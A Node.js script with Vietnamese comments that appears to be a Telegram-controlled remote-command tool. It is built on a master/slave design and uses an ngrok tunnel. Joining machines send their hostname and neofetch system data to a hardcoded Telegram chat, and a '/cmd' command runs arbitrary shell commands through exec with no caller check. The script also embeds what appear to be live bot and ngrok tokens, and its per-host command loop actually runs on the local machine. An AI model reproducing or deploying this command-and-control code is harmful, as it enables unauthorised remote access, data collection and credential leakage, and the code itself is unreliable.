// npm install express node-telegram-bot-api ngrok 
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');
const ngrok = require('ngrok');

// ==================== CẤU HÌNH ====================
const CẤU_HÌNH = {
  TOKEN: '7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts',
  CHAT_ID: '7371969470',
  CỔNG_HTTP: Math.floor(Math.random() * 2000) + 8000,
  NGROK_AUTH: '2vYg8D0LBx82zPbpAwl0ZMGSyma_2MKuxq8wxjoxVagErnREc'
};

// ==================== KHỞI TẠO ====================
const bot = new TelegramBot(CẤU_HÌNH.TOKEN);
const làMaster = process.env.MASTER === 'true';
const URL_MASTER = process.env.MASTER_URL;
const TÊN_MÁY = os.hostname();
let danhSáchSlave = [];
let httpTunnel;
const app = express();
app.use(express.json());

// ==================== TIỆN ÍCH ====================

// Lấy thời gian hiện tại theo múi giờ Việt Nam
const lấyGiờViệtNam = () => new Date().toLocaleString('vi-VN', {
  timeZone: 'Asia/Ho_Chi_Minh',
  hour12: false,
  year: 'numeric',
  month: '2-digit',
  day: '2-digit',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit'
});

// Chạy lệnh neofetch để lấy thông tin hệ thống
const chạyNeofetch = (callback) => exec(
  '[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (command -v neofetch >/dev/null && neofetch --stdout) || (git clone https://github.com/dylanaraps/neofetch 2>/dev/null && ./neofetch/neofetch --stdout) || echo "Không chạy được neofetch"',
  { timeout: 5000 },
  (error, stdout, stderr) => callback(stdout || stderr || error?.message || 'Không lấy được thông tin hệ thống')
);

// Lấy danh sách slave đang online
const lấySlaveOnline = () => danhSáchSlave.filter(s => Date.now() - s.lastPing < 15000);

// ==================== XỬ LÝ THÔNG BÁO ====================

// Gửi thông báo thay đổi trạng thái slave
const thôngBáoSlave = async (tênMáy, đangKếtNối, cổng = 'không rõ') => {
  try {
    const thờiGian = lấyGiờViệtNam();
    const tinNhắn = đangKếtNối 
      ? `🕒 [${thờiGian}] Slave kết nối:\n🏷️ ${tênMáy}\n🔌 Cổng: ${cổng}`
      : `🕒 [${thờiGian}] Slave ngắt kết nối: ${tênMáy}`;
    
    if (đangKếtNối) {
      chạyNeofetch(async (thôngTin) => {
        await bot.sendMessage(CẤU_HÌNH.CHAT_ID, `${tinNhắn}\n\n🖥️ Thông tin hệ thống:\n\`\`\`\n${thôngTin}\n\`\`\``, { parse_mode: 'Markdown' });
      });
    } else {
      await bot.sendMessage(CẤU_HÌNH.CHAT_ID, tinNhắn);
    }
  } catch (lỗi) {
    console.error('Lỗi gửi thông báo:', lỗi.message);
  }
};

// ==================== XỬ LÝ LỆNH ====================

// Xử lý lệnh help
const xửLýHelp = async (idChat) => {
  await bot.sendMessage(idChat, `🛠️ Danh sách lệnh:\n/status - Trạng thái hệ thống\n/cmd [lệnh] - Thực thi lệnh\n/neofetch - Thông tin hệ thống\n/help - Trợ giúp`);
};

// Xử lý lệnh status
const xửLýStatus = async (idChat) => {
  const online = lấySlaveOnline();
  let tinNhắn = `🕒 [${lấyGiờViệtNam()}]\n🟢 Master: ${TÊN_MÁY}\n📡 Đang online: ${online.length}/${danhSáchSlave.length}\n`;
  online.forEach(s => {
    const pingGiây = Math.floor((Date.now() - s.lastPing) / 1000);
    tinNhắn += `🤖 ${s.tênMáy} (cổng:${s.cổng}, ping:${pingGiây}s)\n`;
  });
  await bot.sendMessage(idChat, tinNhắn);
};

// Xử lý lệnh neofetch
const xửLýNeofetch = async (idChat) => {
  chạyNeofetch(async (thôngTin) => {
    await bot.sendMessage(idChat, `🕒 [${lấyGiờViệtNam()}]\n🖥️ ${TÊN_MÁY}:\n\`\`\`\n${thôngTin}\n\`\`\``, { parse_mode: 'Markdown' });
  });
};

// Xử lý lệnh cmd
const xửLýLệnh = async (idChat, lệnh) => {
  const slaveOnline = lấySlaveOnline();
  if (!slaveOnline.length) return await bot.sendMessage(idChat, '⚠️ Không có slave nào online');
  
  await bot.sendMessage(idChat, `⚙️ Đang thực thi trên ${slaveOnline.length} slave...`);
  
  for (const slave of slaveOnline) {
    try {
      const kếtQuả = await new Promise(resolve => exec(
        lệnh, 
        { timeout: 10000 }, 
        (e, out, err) => resolve((out || err || e?.message || 'Không có kết quả').trim())
      ));
      await bot.sendMessage(idChat, `💻 ${slave.tênMáy}:\n\`\`\`\n${kếtQuả}\n\`\`\``, { parse_mode: 'Markdown' });
    } catch (e) {
      await bot.sendMessage(idChat, `⚠️ Lỗi từ ${slave.tênMáy}: ${e.message}`);
    }
  }
};

// ==================== API ====================

// Xử lý webhook Telegram
app.post(`/bot${CẤU_HÌNH.TOKEN}`, (req, res) => {
  const { text, chat } = req.body.message || {};
  if (!text?.startsWith('/')) return res.sendStatus(200);

  const lệnh = text.slice(1);
  const bộXửLý = {
    'help': () => xửLýHelp(chat.id),
    'status': () => xửLýStatus(chat.id),
    'neofetch': () => xửLýNeofetch(chat.id),
    'cmd': () => xửLýLệnh(chat.id, lệnh.slice(4).trim())
  };

  const xửLý = bộXửLý[lệnh.split(' ')[0]] || (() => bot.sendMessage(chat.id, '⚠️ Lệnh không hợp lệ'));
  xửLý().finally(() => res.sendStatus(200));
});

// API đăng ký slave
app.post('/register', (req, res) => {
  const { hostname, port } = req.body;
  if (!hostname) return res.sendStatus(400);

  const đãCó = danhSáchSlave.findIndex(s => s.tênMáy === hostname);
  const dữLiệuSlave = { tênMáy: hostname, cổng: port || 'không rõ', lastPing: Date.now() };

  if (đãCó >= 0) danhSáchSlave[đãCó] = dữLiệuSlave;
  else {
    danhSáchSlave.push(dữLiệuSlave);
    thôngBáoSlave(hostname, true, port);
  }
  res.sendStatus(200);
});

// ==================== GIÁM SÁT ====================

// Kiểm tra slave định kỳ
setInterval(() => {
  const bâyGiờ = Date.now();
  danhSáchSlave.filter(s => bâyGiờ - s.lastPing > 15000)
    .forEach(s => thôngBáoSlave(s.tênMáy, false));
  danhSáchSlave = danhSáchSlave.filter(s => bâyGiờ - s.lastPing < 15000);
}, 3000);

// ==================== KHỞI ĐỘNG ====================

app.listen(CẤU_HÌNH.CỔNG_HTTP, async () => {
  console.log(`🚀 Máy chủ chạy trên cổng ${CẤU_HÌNH.CỔNG_HTTP}`);

  if (làMaster) {
    try {
      httpTunnel = await ngrok.connect({
        addr: CẤU_HÌNH.CỔNG_HTTP,
        authtoken: CẤU_HÌNH.NGROK_AUTH,
        region: 'ap'
      });
      console.log(`🌐 Đường hầm: ${httpTunnel}`);

      await bot.setWebHook(`${httpTunnel}/bot${CẤU_HÌNH.TOKEN}`);
      console.log('✅ Đã thiết lập webhook');

      chạyNeofetch(async (thôngTin) => {
        await bot.sendMessage(
          CẤU_HÌNH.CHAT_ID,
          `🕒 [${lấyGiờViệtNam()}]\n🎯 Master ${TÊN_MÁY} đã sẵn sàng!\n🔗 ${httpTunnel}\n🔌 Cổng: ${CẤU_HÌNH.CỔNG_HTTP}\n\nLệnh chạy Slave:\n\`\`\`\nMASTER_URL="${httpTunnel}" node bot.js\n\`\`\`\n\`\`\`\n${thôngTin}\n\`\`\``,
          { parse_mode: 'Markdown' }
        );
      });
    } catch (lỗi) {
      console.error('Lỗi khởi tạo:', lỗi.message);
      process.exit(1);
    }
  } else if (URL_MASTER) {
    setInterval(() => fetch(`${URL_MASTER}/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ hostname: TÊN_MÁY, port: CẤU_HÌNH.CỔNG_HTTP })
    }).catch(console.error), 3000);
  }
});